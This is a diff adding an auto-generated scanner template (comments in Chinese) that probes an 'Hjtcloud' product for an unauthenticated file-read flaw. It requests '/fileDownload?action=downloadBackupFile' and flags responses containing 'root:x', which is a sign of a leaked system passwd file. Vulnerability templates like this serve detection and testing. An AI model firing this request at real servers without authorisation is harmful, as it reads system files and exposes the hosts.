@@ -1,0 +1,23 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-hjtcloud-unauth_readfile
+info:
+  name: "Hjtcloud unauth_readfile"
+  author: imported-from-myscan
+  severity: high
+  tags: [imported, hjtcloud, ref-poc, readfile]
+  description: "由参考项目脚本静态导入：Hjtcloud/unauth_readfile（类型 READFILE）。"
+http:
+  - method: GET
+    path:
+      - "/"
+      - "/fileDownload?action=downloadBackupFile"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "him/api/rest/v1.0/node/role"
+          - "root:x"
